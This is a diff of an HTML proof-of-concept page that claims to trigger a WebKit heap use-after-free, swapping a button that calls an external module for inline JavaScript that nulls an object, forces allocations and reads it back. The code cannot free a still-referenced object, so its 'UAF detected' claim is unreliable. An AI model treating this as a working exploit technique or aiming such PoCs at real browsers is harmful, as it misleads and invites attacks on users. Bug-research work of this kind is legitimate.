@@ -1,50 +1,46 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bug ----- </title>
-    <style>
-      .container {
-        overflow: hidden;
-        content-visibility: auto;
-        transform: translateZ(0);
-        position: relative;
-        width: 200px;
-        height: 200px;
-      }
-      .child {
-        width: 100px;
-        height: 100px;
-        position: absolute;
-        top: 0;
-        left: 0;
-        background: blue;
-        transform: translateZ(0);
-      }
-      button {
-        margin-top: 20px;
-        padding: 10px;
-        font-size: 16px;
-      }
-    </style>
+    <script>
+        function triggerUAFWithoutJIT() {
+            console.log("Attempting to trigger UAF without JIT...");
+
+            // الخطوة 1: إنشاء كائن مع مرجع
+            let obj = { prop: 42 };
+            let condition = { object: obj, property: "prop" };
+
+            // محاكاة سلوك watchpoint يدويًا
+            let watchpoint = {
+                fire: function() {
+                    try {
+                        console.log("Firing on:", condition.object.prop);
+                    } catch (e) {
+                        console.log("UAF detected:", e.message);
+                        alert("UAF detected: " + e.message);
+                    }
+                }
+            };
+
+            // الخطوة 2: تخصيص ذاكرة كبيرة لتحفيز GC
+            function forceGC() {
+                let largeArray = new Array(10000);
+                for (let i = 0; i < 10000; i++) {
+                    largeArray[i] = new ArrayBuffer(1024); // تخصيص صغير لتجنب الحدود
+                }
+                obj = null; // إفساح المجال لجمع القمامة
+                if (typeof gc === "function") gc(); // إذا كان متاحًا
+                return largeArray;
+            }
+            forceGC();
+
+            // الخطوة 3: محاولة تفعيل الـ watchpoint بعد تدمير الكائن
+            setTimeout(() => {
+                watchpoint.fire(); // محاولة الوصول بعد GC
+            }, 100); // تأخير للسماح بجمع القمامة
+        }
+    </script>
 </head>
 <body>
-    <h1>UAF: WebKit Heap Use-After-Free</h1>
-    <p>Click the button to see the bug in action. (Browser crashes or [+] UAF triggered)</p>
-    <button id="button">Click me</button>
-    <div class="container">
-      <div class="child"></div>
-    </div>
-    <script type="module">
-        import { triggerUAF } from './poc.js';
-        document.getElementById('button').addEventListener('click', () => {
-            try {
-                triggerUAF();
-            } catch (e) {
-                alert('Error: ' + e.message);
-            }
-        });
-    </script>
+    <button onclick="triggerUAFWithoutJIT()">Trigger UAF Test</button>
 </body>
 </html>
